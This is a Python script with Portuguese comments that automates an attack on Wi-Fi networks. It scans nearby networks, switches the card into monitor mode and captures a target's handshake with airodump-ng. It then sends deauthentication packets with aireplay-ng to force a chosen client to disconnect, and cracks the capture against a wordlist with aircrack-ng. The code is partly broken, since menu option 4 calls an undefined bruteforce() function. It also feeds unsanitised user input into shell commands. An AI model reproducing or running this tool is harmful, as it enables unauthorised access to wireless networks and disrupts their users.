import os #importa biblioteca os para trabalhar com sistema op.

def script(comando): #função para mandar comandos pelo terminal
  os.system(comando)

def criar_dir(): #cria diretórios para arquivos
  dirm = (str(os.getcwd())+'/wifon') #diretório padrão para arquivos do programa
  if not os.path.exists(dirm): #se tiver diretório irá criar se não deixa baixo
    os.makedirs(dirm)
    return dirm  
  return dirm #retorna string com diretório 


samedir = criar_dir() #passa string para uma variável

def apagar_dir(): #Deleta diretório criado anteriormente
  if os.path.exists(samedir):
    script('rm -r %s' %(samedir))
    x = "Arquivos deletados"
    print(x)
    return x
  else:
    return "Não existem arquivos"


def inicial(): #função das opção
  print("\n1-Ativar placa de rede\n"
        "\n2-Colocar placa em monitoraramento\n"
        "\n3-Procurar clientes, capturar handshake\n"
        "\n4-Realizar Bruteforce\n"
        "\n100-Mostrar opções novamente\n"
        "\nSair-Adivinhe")
  

def ativar_wifi():
  print('#######',end='')
  print('#######',end='')
  script("ifconfig wlan0 up") #ativa placa de rede wlan0, lembrar de criar forma de selecionar placa dinamicamente
  print("wlan0 ativa",end='')
  script("iwlist wlan0 scanning |less |egrep 'Address|Channel|Quality=|ESSID:' > %s/h4ck3d.txt" %(samedir)) #escaneia redes e mostra apenas 
  print('#######',end='')                                                                                   # Address, Canal e qualidade
  print('#######',end='')
  script('clear')
  script('clear')

def ativar_mon():  #coloca placa em monitoramento
  script("airmon-ng start wlan0")
  script("clear")
  print("wlan0 em modo monitoramento")
        
def handshake():
  script("cat %s/h4ck3d.txt" %(samedir))  #lista redes encontradas
  bssid = input("Address: ")
  channel = input("Channel: ")
  nome = "ataque"
  bash = open("%s/bash.sh" %(samedir), "w") #cria arquivo com comando para abrir em outro terminal
  comand = ("lxterminal --command='airodump-ng  wlan0mon --bssid %s --channel %s --write %s/%s' " %(bssid, channel,samedir, nome))
  #esse comando abre nova janela do terminal rodando airodump com rede e canal selecionados antes e grava o handshake numa pasta do script
  bash.write(comand) #grava comando em bash.sh
  bash.close()       
  script("airodump-ng  wlan0mon --bssid %s --channel %s" %(bssid, channel)) #abre uma janela para pegar o cliente, sem captura de handshake
  cliente = input("Cliente: ")
  print("\n\n\n###########Aguarde o alvo ficar 0 e aperte  CTRL+C###########\n\n\n")
  script('chmod 777 %s/bash.sh; cd %s ; ./bash.sh' %(samedir, samedir)) #dá permições totais ao arquivo e executa ele
  script('aireplay-ng wlan0mon -0 100 -a %s -c %s ' %(bssid, cliente)) #envia pacotes de desautenticação para o Dispositivo alvo
  wordlist = input("Nome da WordList: ")
  script('aircrack-ng %s/%s-01.cap -w %s' %(samedir, nome, wordlist))


def sair():
  script("airmon-ng stop wlan0mon; ifconfig wlan0 up")



criar_dir()
inicial()
while True:
  escolha =  input("\nAção:")
  print("\n\n\n\n ")

  if escolha == "1":
    ativar_wifi()
  elif escolha == "2":
    ativar_mon()
  elif escolha == "3":
    handshake()
  elif escolha == "100":
    inicial()
  elif escolha == "4":
    bruteforce()

  elif escolha.lower() == "sair":
    escolhal = input("Deseja deletar todos os arquivos? [S/n]")
    if escolhal.lower() == "s":
      sair()
      break
    else:
      break

  else:
    print("Opção inválida")

    

        